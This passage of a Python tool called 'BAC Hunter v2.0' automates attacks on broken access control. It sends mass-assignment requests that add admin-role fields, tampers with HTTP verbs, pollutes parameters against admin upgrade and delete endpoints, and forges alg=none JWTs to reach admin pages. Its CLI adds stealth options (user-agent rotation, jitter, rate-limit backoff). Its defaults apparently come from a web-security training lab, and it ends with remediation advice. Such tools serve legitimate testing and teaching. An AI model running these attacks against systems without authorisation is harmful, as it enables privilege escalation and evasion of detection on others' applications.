                    if any(m in allowed for m in ['DELETE', 'PUT', 'PATCH']):
                        warn(f"Sensitive methods exposed via OPTIONS on {path}: {allowed}")
                        finding['detail'] = f"OPTIONS {path} exposes: {allowed}"

                if G_STEALTH:
                    jitter()
            except Exception as e:
                info(f"  {method} {path}  →  error: {e}")

    if not finding['vuln']:
        fail("HTTP verb tampering bypass not confirmed.")
    return finding

# ─── Test 17 — NEW ────────────────────────────────────────────────────────────

def test_17_mass_assignment(url, proxies, verify):
    """
    Test mass assignment / auto-binding of privilege fields.
    APIs that bind all POST/PUT params may accept extra fields like isAdmin, role, etc.
    """
    section(17, "Mass Assignment (Extra Privilege Fields)", "High")
    finding = {'id': 17, 'name': 'Mass Assignment', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")

    # Endpoints that might accept profile/account updates
    endpoints = [
        "/my-account/change-email",
        "/account/update",
        "/profile",
        "/api/user",
        "/api/account",
        "/user/settings",
    ]

    extra_fields_variants = [
        {"isAdmin": True},
        {"isAdmin": "true"},
        {"admin": True},
        {"role": "admin"},
        {"role": "administrator"},
        {"userType": "admin"},
        {"permissions": "admin"},
        {"privilege": "high"},
        {"access_level": 9999},
    ]

    base_data = {"email": "test@test.local"}

    for endpoint in endpoints:
        for extra in extra_fields_variants:
            payload = {**base_data, **extra}
            r = safe_post(s, url + endpoint, proxies, verify, json_data=payload)
            if not r:
                continue
            info(f"  POST {endpoint} + {extra}  →  HTTP {r.status_code}")
            # Check if the response references admin/elevated role
            if r.status_code in (200, 201) and any(k in r.text.lower() for k in
                    ['admin', 'administrator', 'elevated', '"isAdmin":true', '"role":"admin"']):
                vuln(f"Mass assignment accepted: {extra} on {endpoint}")
                finding['vuln'] = True
                finding['detail'] = f"Field {list(extra.keys())[0]}={list(extra.values())[0]} accepted at {endpoint}"
                return finding

    if not finding['vuln']:
        fail("Mass assignment not detected.")
    return finding

# ─── Test 18 — NEW ────────────────────────────────────────────────────────────

def test_18_parameter_pollution(url, proxies, verify):
    """
    Test HTTP parameter pollution (HPP) on access-controlled actions.
    Duplicate parameters may confuse the parser into accepting a lower privilege value.
    """
    section(18, "HTTP Parameter Pollution (Duplicate Params)", "Medium")
    finding = {'id': 18, 'name': 'HTTP Parameter Pollution', 'vuln': False,
               'detail': '', 'severity': 'Medium'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")

    # Duplicate the 'username' or 'action' param — app might use the first (target)
    # while a WAF checks the second (innocent value)
    test_cases = [
        # (url_suffix, description)
        (f"/admin-roles?username=administrator&action=upgrade&username={G_CREDS[0]}",
         "Duplicate username (admin first)"),
        (f"/admin-roles?action=upgrade&action=view&username={G_CREDS[0]}",
         "Duplicate action (upgrade first)"),
        (f"/admin/delete?username=carlos&username={G_CREDS[0]}",
         "Duplicate username on delete"),
    ]

    for suffix, desc in test_cases:
        if G_PASSIVE and 'delete' in suffix:
            warn(f"PASSIVE MODE: Skipping destructive HPP test — {desc}")
            continue
        r = safe_get(s, url + suffix, proxies, verify)
        info(f"  {desc}  →  HTTP {r.status_code if r else 'ERR'}")
        if r and r.status_code == 200 and any(k in r.text.lower() for k in
                ['congratulations', 'solved', 'admin', 'deleted', 'upgraded']):
            vuln(f"Parameter pollution bypass confirmed: {desc}")
            finding['vuln'] = True
            finding['detail'] = f"HPP via: {suffix[:80]}"
            break

    if not finding['vuln']:
        fail("Parameter pollution bypass not confirmed.")
    return finding

# ─── Test 19 — NEW ────────────────────────────────────────────────────────────

def _forge_jwt_none(original_token: str) -> str | None:
    """
    Forge a JWT with alg=none by stripping the signature.
    Only modifies the algorithm — does NOT change claims (to avoid noise).
    Returns None if the token is not a valid JWT.
    """
    try:
        parts = original_token.split('.')
        if len(parts) != 3:
            return None
        # Decode header
        pad = lambda s: s + '=' * (-len(s) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        # Return token with empty signature
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None

def test_19_jwt_none_alg(url, proxies, verify):
    """
    Test JWT 'none' algorithm bypass.
    If the app accepts a JWT with alg=none, the signature is not verified.
    """
    section(19, "JWT 'none' Algorithm Bypass", "Critical")
    finding = {'id': 19, 'name': "JWT 'none' Alg Bypass", 'vuln': False,
               'detail': '', 'severity': 'Critical'}

    # We need to get a valid JWT first — try logging in and checking cookies/headers
    s = new_session()
    logged_in, r_login = default_login(s, url, proxies, verify)

    jwt_token = None
    # Check Authorization header, common cookie names
    if r_login:
        auth_hdr = r_login.headers.get('Authorization', '')
        if auth_hdr.startswith('Bearer '):
            jwt_token = auth_hdr.split(' ', 1)[1]
    if not jwt_token:
        for cookie_name in ['token', 'jwt', 'access_token', 'id_token', 'auth']:
            jwt_token = s.cookies.get(cookie_name)
            if jwt_token:
                break
    if not jwt_token:
        # Check session cookie — some apps use JWT as session value
        session_val = s.cookies.get('session', '')
        if session_val.count('.') == 2:
            jwt_token = session_val

    if not jwt_token:
        fail("No JWT token found in cookies or headers — skipping.")
        return finding

    info(f"JWT found: {jwt_token[:40]}…")
    forged = _forge_jwt_none(jwt_token)
    if not forged:
        fail("Token does not appear to be a JWT.")
        return finding

    info(f"Forged JWT (alg=none): {forged[:40]}…")

    # Try the forged token against protected endpoints
    protected = ['/admin', '/admin-panel', '/my-account?id=administrator']
    for path in protected:
        headers = {"Authorization": f"Bearer {forged}"}
        # Also try as cookie
        r1 = safe_get(s, url + path, proxies, verify, extra_headers=headers)
        r2 = requests.get(url + path, cookies={'session': forged, 'token': forged},
                          headers=stealth_headers(), verify=verify, proxies=proxies, timeout=10)

        for r, method in [(r1, "Authorization header"), (r2, "Cookie")]:
            if r and r.status_code == 200 and any(k in r.text.lower() for k in
                    ['admin', 'delete user', 'administrator', 'my account']):
                vuln(f"JWT none bypass via {method} on {path}!")
                finding['vuln'] = True
                finding['detail'] = f"alg=none accepted via {method} on {path}"
                return finding
        info(f"  {path}  →  header: {r1.status_code if r1 else 'ERR'}  cookie: {r2.status_code if r2 else 'ERR'}")

    if not finding['vuln']:
        fail("JWT 'none' algorithm bypass not confirmed.")
    return finding

# ─── Test registry ────────────────────────────────────────────────────────────

ALL_TESTS = {
    1:  ("Unprotected Admin Panel",              test_01_unprotected_admin_panel),
    2:  ("Admin Path Disclosed in Source",       test_02_admin_path_in_source),
    3:  ("Cookie Bypass (Admin=true)",           test_03_cookie_bypass),
    4:  ("Role ID Escalation (JSON)",            test_04_role_id_escalation),
    5:  ("X-Original-URL / X-Rewrite-URL Bypass",test_05_x_original_url_bypass),
    6:  ("Method-Based Bypass (GET→privileged)", test_06_method_based_bypass),
    7:  ("IDOR Horizontal Escalation",           test_07_idor_horizontal),
    8:  ("IDOR via GUID",                        test_08_idor_guid),
    9:  ("IDOR Redirect Leak (302)",             test_09_idor_redirect_leak),
    10: ("IDOR Admin Password Extraction",       test_10_idor_admin_password),
    11: ("IDOR File Download",                   test_11_insecure_file_reference),
    12: ("Missing Function-Level Access Ctrl",   test_12_missing_function_access_control),
    13: ("Referer Header Bypass",                test_13_referer_based_bypass),
    14: ("IP Spoof / Forwarding Header Bypass",  test_14_ip_spoof_headers),
    15: ("Path Normalisation / Encoding Bypass", test_15_path_normalisation_bypass),
    16: ("HTTP Verb Tampering",                  test_16_http_verb_tampering),
    17: ("Mass Assignment",                      test_17_mass_assignment),
    18: ("HTTP Parameter Pollution",             test_18_parameter_pollution),
    19: ("JWT 'none' Algorithm Bypass",          test_19_jwt_none_alg),
}

# ─── JSON report ──────────────────────────────────────────────────────────────

def write_json_report(findings, output_path, target_url):
    report = {
        "tool": "BAC Hunter v2.0",
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "summary": {
            "total_tests": len(findings),
            "vulnerabilities": sum(1 for f in findings if f['vuln']),
            "by_severity": {
                "Critical": sum(1 for f in findings if f['vuln'] and f.get('severity') == 'Critical'),
                "High":     sum(1 for f in findings if f['vuln'] and f.get('severity') == 'High'),
                "Medium":   sum(1 for f in findings if f['vuln'] and f.get('severity') == 'Medium'),
                "Low":      sum(1 for f in findings if f['vuln'] and f.get('severity') == 'Low'),
            }
        },
        "findings": [
            {
                "id": f['id'],
                "name": f['name'],
                "vulnerable": f['vuln'],
                "severity": f.get('severity', 'Unknown'),
                "detail": f.get('detail', ''),
            }
            for f in findings
        ]
    }
    with open(output_path, 'w') as fh:
        json.dump(report, fh, indent=2)
    ok(f"JSON report written to: {output_path}")

# ─── CLI ──────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="BAC Hunter — Broken Access Control Bug Bounty Suite v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 bac_hunter.py https://target.com --stealth --passive
  python3 bac_hunter.py https://target.com --test 1 5 14 15 16
  python3 bac_hunter.py https://target.com --proxy http://127.0.0.1:8080 --output findings.json
  python3 bac_hunter.py https://target.com --creds admin:hunter2 --no-proxy --stealth
        """
    )
    parser.add_argument("url", help="Target base URL (e.g. https://target.example.com)")
    parser.add_argument("--test", nargs='+', type=int, metavar="N",
                        help=f"Run specific tests by number (1–{len(ALL_TESTS)})")
    parser.add_argument("--proxy", default="http://127.0.0.1:8080",
                        help="Proxy URL (default: Burp at 127.0.0.1:8080)")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy")
    parser.add_argument("--verify-ssl", action="store_true",
                        help="Enable SSL certificate verification")
    parser.add_argument("--delay", nargs=2, type=float, metavar=("MIN", "MAX"),
                        default=None, help="Jitter delay range in seconds (e.g. --delay 1.0 3.0)")
    parser.add_argument("--stealth", action="store_true",
                        help="Enable stealth mode: UA rotation, longer jitter, rate-limit backoff")
    parser.add_argument("--passive", action="store_true",
                        help="Skip ALL destructive / mutating PoC actions (safe for prod)")
    parser.add_argument("--creds", default="wiener:peter", metavar="USER:PASS",
                        help="Test credentials (default: wiener:peter)")
    parser.add_argument("--ua", metavar="FILE",
                        help="Path to custom User-Agent list (one per line)")
    parser.add_argument("--output", metavar="FILE",
                        help="Write JSON findings report to file")
    parser.add_argument("--list", action="store_true",
                        help="List all available tests and exit")
    return parser.parse_args()


def main():
    global G_STEALTH, G_PASSIVE, G_DELAY_MIN, G_DELAY_MAX, G_UA_POOL, G_CREDS

    args = parse_args()
    banner()

    if args.list:
        print(f"{BOLD}Available Tests:{RESET}")
        for num, (name, _) in ALL_TESTS.items():
            new_tag = f"  {GREEN}[NEW]{RESET}" if num >= 14 else ""
            print(f"  {CYAN}{num:02d}{RESET}  {name}{new_tag}")
        sys.exit(0)

    # Apply globals
    G_STEALTH  = args.stealth
    G_PASSIVE  = args.passive
    G_CREDS    = tuple(args.creds.split(':', 1)) if ':' in args.creds else ("wiener", "peter")

    if args.delay:
        G_DELAY_MIN, G_DELAY_MAX = args.delay
    elif G_STEALTH:
        G_DELAY_MIN, G_DELAY_MAX = 0.8, 2.5
    else:
        G_DELAY_MIN, G_DELAY_MAX = 0.3, 1.0

    if args.ua:
        try:
            with open(args.ua) as fh:
                ua_list = [l.strip() for l in fh if l.strip()]
            if ua_list:
                G_UA_POOL = ua_list
                ok(f"Loaded {len(ua_list)} User-Agents from {args.ua}")
        except Exception as e:
            warn(f"Could not load UA file: {e} — using built-in pool")

    url     = args.url.rstrip('/')
    proxies = {} if args.no_proxy else {'http': args.proxy, 'https': args.proxy}
    verify  = args.verify_ssl

    if args.test:
        invalid = [t for t in args.test if t not in ALL_TESTS]
        if invalid:
            print(f"{RED}Invalid test numbers: {invalid}. Valid range: 1–{len(ALL_TESTS)}{RESET}")
            sys.exit(1)
        tests_to_run = {k: ALL_TESTS[k] for k in sorted(args.test)}
    else:
        tests_to_run = ALL_TESTS

    # Config summary
    print(f"  {BOLD}Target    :{RESET} {url}")
    print(f"  {BOLD}Proxy     :{RESET} {'disabled' if args.no_proxy else args.proxy}")
    print(f"  {BOLD}SSL verify:{RESET} {verify}")
    print(f"  {BOLD}Credentials:{RESET} {G_CREDS[0]}:{'*'*len(G_CREDS[1])}")
    print(f"  {BOLD}Stealth   :{RESET} {'ON  (UA rotation + jitter + rate-limit backoff)' if G_STEALTH else 'OFF'}")
    print(f"  {BOLD}Passive   :{RESET} {'ON  (no destructive PoC actions)' if G_PASSIVE else 'OFF'}")
    print(f"  {BOLD}Jitter    :{RESET} {G_DELAY_MIN:.1f}–{G_DELAY_MAX:.1f}s")
    print(f"  {BOLD}Tests     :{RESET} {list(tests_to_run.keys())}")

    # Connectivity check
    print()
    info("Running connectivity check…")
    try:
        r = requests.get(url, headers=stealth_headers(), verify=verify,
                         proxies=proxies, timeout=10)
        ok(f"Target reachable — HTTP {r.status_code}")
    except Exception as e:
        fail(f"Cannot reach target: {e}")
        warn("Check the URL and proxy settings, then retry.")
        sys.exit(1)

    findings = []
    for num, (name, func) in tests_to_run.items():
        try:
            finding = func(url, proxies, verify)
            findings.append(finding)
        except Exception as e:
            fail(f"Unexpected error in Test {num:02d}: {e}")
            findings.append({'id': num, 'name': name, 'vuln': False,
                             'severity': 'Unknown', 'detail': f'Error: {e}'})
        jitter()

    result_box(findings)

    vuln_count = sum(1 for f in findings if f['vuln'])
    if vuln_count:
        crit = sum(1 for f in findings if f['vuln'] and f.get('severity') == 'Critical')
        high = sum(1 for f in findings if f['vuln'] and f.get('severity') == 'High')
        med  = sum(1 for f in findings if f['vuln'] and f.get('severity') == 'Medium')
        print(f"{RED}{BOLD}  {vuln_count} vulnerability/vulnerabilities detected.{RESET}")
        if crit: print(f"  {RED}{BOLD}  Critical: {crit}{RESET}")
        if high: print(f"  {MAGENTA}  High:     {high}{RESET}")
        if med:  print(f"  {YELLOW}  Medium:   {med}{RESET}")
        print(f"\n{YELLOW}  Remediation: enforce server-side access control on every endpoint,")
        print(f"  never rely on client-supplied roles/cookies/headers/IPs, use indirect")
        print(f"  object references, validate JWTs properly, and restrict HTTP methods.{RESET}\n")
    else:
        print(f"{GREEN}{BOLD}  No broken access control vulnerabilities detected in this run.{RESET}\n")

    if args.output:
        write_json_report(findings, args.output, url)


if __name__ == "__main__":
    main()
